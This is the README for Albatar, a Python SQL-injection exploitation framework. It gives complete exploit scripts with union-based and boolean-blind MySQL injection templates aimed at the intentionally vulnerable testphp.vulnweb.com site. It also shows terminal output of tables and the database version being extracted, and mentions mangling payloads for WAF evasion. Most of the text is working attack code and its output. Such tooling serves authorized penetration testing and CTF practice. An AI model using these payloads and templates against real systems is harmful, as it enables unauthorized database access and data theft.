I wrote Albatar to have a neat and tidy tool to exploit SQL Injection vulnerabilities.

Unlike [sqlmap](http://sqlmap.org/), Albatar will not detect SQL Injection vulnerabilities but it is designed to exploit not-so-straightforward SQLIs where sqlmap would need tweaking and patching to work.

Albatar is a framework in Python. As a result, you need to write some Python code to be able to exploit the SQLI. Then simply invoke your script by passing sqlmap-like command line options (e.g. --dbs, --banner ...) to retrieve data from the database.

Currently, Albatar supports MySQL, MSSQL and Oracle with the Union, Error, Boolean and Time techniques.

## Examples

* Simple union-based SQLI (MySQL)

Let's use Albatar to exploit a dead-simple union-based SQLI at http://testphp.vulnweb.com/artists.php?artist=1. Clone the repository, and create the below script:
```python
from albatar import *
from urllib import quote
import re

PROXIES = {} #'http': 'http://127.0.0.1:8082', 'https': 'http://127.0.0.1:8082'}
HEADERS = ['User-Agent: Mozilla/5.0']

def extract_results(headers, body, time):
  return re.findall(':ABC:(.+?):ABC:', body, re.S)

def mysql_union():

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://testphp.vulnweb.com/artists.php?artist=${injection}',
      method = 'GET',
      response_processor = extract_results,
      encode_payload = quote,
      )

  template = '-1 union all select null,null,concat(0x3a4142433a,X,0x3a4142433a) from ${query}-- '

  return Method_union(make_requester, template)

sqli = MySQL_Inband(mysql_union())

for r in sqli.exploit():
  print r
```

And execute the script to exploit the SQLI:
```bash
$ python testphp-union.py -D acuart --tables
17:39:59 albatar - Starting Albatar v0.0 (https://github.com/lanjelot/albatar) at 2016-04-21 17:39 AEST
17:39:59 albatar - Executing: ('(SELECT COUNT(*) X FROM information_schema.tables WHERE table_schema="acuart")a', '(SELECT table_name X FROM information_schema.tables WHERE table_schema="acuart" LIMIT ${row_pos},${row_count})a')
17:39:59 albatar - count: 8
artists
carts
categ
featured
guestbook
pictures
products
users
17:40:05 albatar - Time: 0h 0m 5s
```

* Simple boolean-based SQLI (MySQL)

Here's how to exploit a boolean-based SQLI at http://testphp.vulnweb.com/listproducts.php?cat=1.
```python
from albatar import *
from urllib import quote
import re

PROXIES = {} #'http': 'http://127.0.0.1:8082', 'https': 'http://127.0.0.1:8082'}
HEADERS = ['User-Agent: Mozilla/5.0']

def test_state_grep(headers, body, time):
  if 'Lorem ipsum dolor sit amet' in body:
    return 1
  else:
    return 0

def mysql_boolean():

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://testphp.vulnweb.com/listproducts.php?cat=${injection}',
      method = 'GET',
      response_processor = test_state_grep,
      encode_payload = quote
      )

  template = '1 and (ascii(substring((${query}),${char_pos},1))&${bit_mask})=${bit_mask}'

  return Method_bitwise(make_requester, template)

sqli = MySQL_Blind(mysql_boolean())

for r in sqli.exploit():
  print r
```

And execute:
```bash
$ python testphp.py -b
14:19:22 albatar - Starting Albatar v0.0 (https://github.com/lanjelot/albatar) at 2016-04-21 14:19 AEST
14:19:22 albatar - Executing: 'SELECT VERSION()'
5.1.73-0ubuntu0.10.04.1
14:19:41 albatar - Time: 0h 0m 19s
```

* Encoding / WAF evasion

If you need to encode your payload to meet specific requirements, simply code a function to mangle the payload in every request.
The web task [luhn-300](https://github.com/ctfs/write-ups-2016/tree/master/nullcon-hackim-2016/web/luhn-300) for Hackim CTF 2016 was a good example to showcase this.
